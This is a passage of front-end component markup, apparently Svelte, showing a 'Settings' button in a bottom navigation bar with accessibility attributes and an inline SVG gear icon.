    class="bn-item {activeBottomTab === 'settings' ? 'bn-active' : ''}"
    onclick={() => setBottomTab("settings")}
    aria-label="Settings"
    aria-current={activeBottomTab === "settings" ? "page" : undefined}
  >
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      stroke-width="2"
    >
      <circle cx="12" cy="12" r="3" />
      <path
        d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"
      />
    </svg>
    <span class="bn-label">Settings</span>
  </button>
</nav>
